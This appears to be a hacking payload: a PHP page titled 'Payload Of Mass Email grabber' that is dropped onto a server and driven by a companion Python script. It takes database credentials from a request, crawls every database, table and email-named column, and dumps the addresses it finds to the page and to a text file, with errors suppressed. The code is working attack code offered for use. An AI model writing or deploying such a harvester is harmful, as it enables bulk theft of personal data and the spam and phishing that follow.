<!DOCTYPE html>
<html>
<head>
	<title>Payload Of Mass Email grabber</title>
</head>

<style>
    body{
    	padding: 0;
    	margin: 0;
    	background-image: url('https://static1.squarespace.com/static/54d09890e4b01d126f05a2e1/56c33e16b654f95147f1749a/56cdf9d6c2ea510fbd51bbae/1456339458974/Original.gif');
    	/*background-repeat: no-repeat;*/
    	background-size: 105%;

    }
	.div{
		padding-top: 25px;
		margin-top: 80px; 
		width: 70%;
		background: rgba(255, 255, 255, 0.8);
		padding-bottom: 25px;

	}
	.tit{
		font-family: "Comic Sans MS", cursive, sans-serif;
	}
	p{
		font-family: "Comic Sans MS", cursive, sans-serif	;
		padding-left: 20px;
		text-align: left;
	}
</style>

<body>
	<center><div class="div">
		<h1 class="tit">Coded By Attari</h1>
		<span>Notice: <mark>if u changed anything from this script will not connect with the script python</mark>
	</div></center>


<?php
        @set_time_limit(0);error_reporting(0);
        
        if(!empty($_GET["rm"])){unlink('emails.txt');echo '<script> alert("email file deleted");window.location="'  . $_SERVER["PHP_SELF"] . '";</script>';}
        if(!empty($_POST["server"])){
                $vr=false;if(!empty($_POST["filesf"])){if($_POST["filesf"]=="on"){$vr=true;}}
                if($vr==true){ignore_user_abort(true);$fh = fopen("emails.txt", 'w') or die("can't open file " . getcwd() . '/emails.txt');}
                mysql_connect($_POST["server"], $_POST["user"], $_POST["pw"]) OR die("not connected");
                $res1 = mysql_query("SHOW DATABASES");
                while ($row1 = mysql_fetch_assoc($res1)) {
                        $res2 = mysql_query("SHOW TABLES FROM " . $row1['Database']);
                        while ($row2 = mysql_fetch_assoc($res2)) {
                                $res3 = mysql_query("SHOW COLUMNS FROM " . $row1['Database'] . "." . $row2['Tables_in_' . $row1['Database']]);
                                while ($row3 = mysql_fetch_assoc($res3)) {
                                        if(strstr($row3['Field'], "email")) {
                                                $res4 = mysql_query("select " . $row3['Field'] ." FROM " . $row1['Database'] . "." . $row2['Tables_in_' . $row1['Database']]);
                                                while ($row4 = mysql_fetch_assoc($res4)) {if(!empty($row4[$row3['Field']])){if(strstr($row4[$row3['Field']], "@")){echo $row4[$row3['Field']] . "\n";if($vr==true){fwrite($fh, $row4[$row3['Field']] . "\n");}}}}
                                        }
                                }
                       
                        }      
                }
                if($vr==true){fclose($fh);echo 'atx the fucker';}
        }else{
                echo '';
        }
?>
</body>
</html>